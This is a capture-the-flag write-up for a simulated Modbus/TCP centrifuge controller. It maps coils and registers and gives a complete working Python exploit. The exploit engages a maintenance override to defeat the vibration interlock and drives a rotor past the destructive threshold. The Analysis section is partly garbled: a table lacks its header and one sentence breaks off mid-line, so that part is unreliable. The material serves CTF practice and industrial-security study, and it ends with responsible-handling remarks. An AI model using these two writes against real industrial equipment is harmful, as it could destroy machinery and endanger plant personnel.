# OT#007 — Centrifuge-Resonance: outrunning a working vibration interlock with one coil

**Flag:** `CTF{713a514d4bb87d6343f976fc56db961d}`  
**Target:** `169.58.126.107:6005` (Modbus/TCP, unit 1) — organizer simulation, live only during the qualifier window (2026-10-04 to 2026-11-04 23:00 UTC)  
**Flag format:** `CTF{...}`

## Challenge

> OT#007 — 140 points. A centrifuge cascade controller — two rotors, one vibration interlock — on a
> real Modbus/TCP endpoint. No source, no binary, no register map.
>
> **Objective:** physically destroy the cascade by driving vibration past the destructive threshold,
> then read the incident flag the controller records.
>
> <https://otctf.pages.dev/ot-007-centrifuge-resonance/light>

Unlike the other OT challenges here, the protection works: vibration forces a controlled stop and the
trip latches.

## Analysis

FC1/3/4/5/6/15/16 answer; FC2 is not implemented — the server **closes the TCP connection** instead of
faulting, so any FC2 sweep silently loses its socket. FC6 ACKs every address 0..99 while only HR0..HR4
retain data, so the setpoints only showed up under FC16. Probing gives coils 0..7, registers 0..99;
the unit id is ignored. A second socket reads all zeros: state lives on the connection, so the attack
fits in one.

### The map

|---:|---|---|
| `coil0` | POWER | mirrors into IR0 bit0 |
| `coil1` | MAINTENANCE OVERRIDE | interlock can no longer force the stop |
| `coil2` | INTERLOCK RESET | pulse clears the latched trip (3 -> 1) |

Setpoints above the cap saturate the same top speed - 10000 and 60000 both ran the cascade to
6003/6095 with IR4 312/316, one poll apart.

coil1 is the override and the only bit needed; with it engaged, B=4200/4600/5000/5400 survived at peak

character in the low byte of each big-endian word (`IR20 = 67 = 'C'`).

## Solution

1. Arm the override: `FC15 @coil0`, 8 coils, one byte `0x03` — POWER + MAINTENANCE OVERRIDE.
2. Split the cascade: `FC16 @HR10`, 10 registers `[0, 6000, 0, 0, 0, 0, 0, 0, 0, 0]` — A parked, B
   past the safe band.
3. Read the incident: `FC4 @0 qty 57` once a second until IR0 = 4.

## Exploit code

```python
#!/usr/bin/env python3
"""OT#007 Centrifuge-Resonance (Africa battleCTF 2026 Qualifier, OT, 140 pts).

Minimal exploit against the Modbus/TCP centrifuge cascade controller:
  * FC15 writes the whole coil image at once -> coil0 (POWER) + coil1
    (MAINTENANCE OVERRIDE) are latched on in a single legitimate write.
  * FC16 writes the speed setpoint block -> HR10 = rotor A (parked),
    HR11 = rotor B (commanded far above the operating band).
With the override engaged the vibration interlock cannot force its
controlled stop, rotor B runs the cascade up to the hardware cap (6095),
vibration crosses the destructive threshold (~300), IR0 latches to 4 and
the incident flag is released into IR20..IR56, one ASCII char per register.
"""
import socket, struct, time

HOST, PORT, UNIT = "169.58.126.107", 6005, 1

class Modbus:
    def __init__(self, host, port, timeout=8.0):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.tid = 0
    def close(self):
        self.s.close()
    def xact(self, unit, pdu):
        self.tid = (self.tid + 1) & 0xFFFF
        self.s.sendall(struct.pack(">HHHB", self.tid, 0, len(pdu) + 1, unit) + pdu)
        hdr = b""
        while len(hdr) < 7:
            chunk = self.s.recv(7 - len(hdr))
            if not chunk:
                raise ConnectionError("connection closed")
            hdr += chunk
        _, _, ln, _ = struct.unpack(">HHHB", hdr)
        body = b""
        while len(body) < ln - 1:
            chunk = self.s.recv(ln - 1 - len(body))
            if not chunk:
                raise ConnectionError("connection closed")
            body += chunk
        if body[0] & 0x80:
            raise IOError(f"modbus exception code {body[1]:#04x}")
        return body
    def read_input(self, addr, qty):
        r = self.xact(UNIT, struct.pack(">BHH", 4, addr, qty))
        return list(struct.unpack(">" + "H" * (r[1] // 2), r[2:2 + r[1]]))
    def write_coils(self, addr, values):
        nbytes = (len(values) + 7) // 8
        raw = bytearray(nbytes)
        for i, v in enumerate(values):
            if v:
                raw[i // 8] |= 1 << (i % 8)
        self.xact(UNIT, struct.pack(">BHHB", 15, addr, len(values), nbytes) + bytes(raw))
    def write_registers(self, addr, values):
        self.xact(UNIT, struct.pack(">BHHB", 16, addr, len(values), 2 * len(values))
                  + struct.pack(">" + "H" * len(values), *values))

def main():
    mb = Modbus(HOST, PORT)
    mb.write_coils(0, [1, 1, 0, 0, 0, 0, 0, 0])            # power + maintenance override
    mb.write_registers(10, [0, 6000, 0, 0, 0, 0, 0, 0, 0, 0])  # rotor A parked, rotor B 6000 rpm
    flag = None
    t0 = time.time()
    while time.time() - t0 < 40:
        time.sleep(1.0)
        ir = mb.read_input(0, 57)
        state, speed_a, speed_b, vib = ir[0], ir[2], ir[3], ir[4]
        print(f"[t+{time.time() - t0:4.1f}s] IR0={state} A={speed_a} B={speed_b} vib={vib}")
        if state == 4:                                    # 4 = cascade destroyed, flag released
            flag = "".join(chr(v & 0xFF) for v in ir[20:57])
            break
    mb.close()
    if not flag or not (flag.startswith("CTF{") and flag.endswith("}")):
        raise SystemExit("no flag captured")
    print("FLAG:", flag)

if __name__ == "__main__":
    main()
```

## Notes

* State is per TCP connection: a new socket resets the plant, so the escalation must fit one
  connection.
* Rate limiting is unforgiving: a 256-unit-id sweep in ~30 s got the source IP silently blocked for
  ~7 minutes, and ~7 connections inside ~5 min got sockets accepted then closed unanswered for ~6-8
  min; one long-lived connection at ~0.5-1 s per request worked.
* Brackets, not constants: the interlock was still running at IR4 148 and stopped on the next poll,
  and the destructive event appeared between a surviving peak of 280 and a destroying 300. Quote the
  protection as `trip just above 150 / destroy around 300`, which is as tight as ~1 s sampling allows.
* No memory corruption, no auth bypass: two legitimate writes (FC15 coils + FC16 setpoints) defeat a
  protection function that otherwise works, on the unauthenticated path the setpoints use.

**Responsible handling.** The target is a CTF plant simulation from the organisers: only the writes the
challenge requires were issued, on one paced connection, and nothing had to be undone — the plant
forgets its state on disconnect. On a real cascade the same two PDUs would destroy rotor and bearing
stack, so this class of testing belongs in a formally authorised window, plant down and de-energised,
override keyed by an operator.
